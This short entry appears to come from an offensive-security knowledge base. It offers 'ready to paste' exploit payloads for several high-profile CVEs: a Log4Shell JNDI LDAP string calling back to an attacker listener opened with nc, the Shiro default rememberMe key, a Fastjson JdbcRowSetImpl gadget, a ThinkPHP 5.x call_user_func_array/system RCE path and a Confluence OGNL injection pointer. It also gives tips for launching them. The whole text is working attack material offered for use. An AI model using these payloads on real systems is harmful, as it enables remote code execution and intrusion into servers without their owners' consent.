title: High-Frequency CVE Literal Payloads (Ready to Paste)
description: Complete one-shot commands — no need to recall them on the spot
detail: LOG4SHELL (Log4j2; any header/parameter injection point): payload ${jndi:ldap://CALLBACK_IP:1389/x}, send via headers such as X-Api-Version, and listen locally with nc -lvnp 1389. SHIRO rememberMe: first try the old default key kPH+bIxk5D2deZiIxcaaaA== (if it fails, rotate through common keys); if ysoserial is unavailable in the image, switch to JNDI. FASTJSON <= 1.2.47: POST a JSON body containing @type com.sun.rowset.JdbcRowSetImpl + dataSourceName pointing to an LDAP callback + autoCommit true. THINKPHP 5.x RCE path s=index/think plus app/invokefunction, function=call_user_func_array, vars[0]=system, vars[1][]=command (URL-encode spaces). CONFLUENCE 22527: search for a public OGNL template injection payload and apply it directly. Principle: confirm the version with nuclei before launching the payload; JNDI requires outbound access — if there is no outbound access, see kb056.
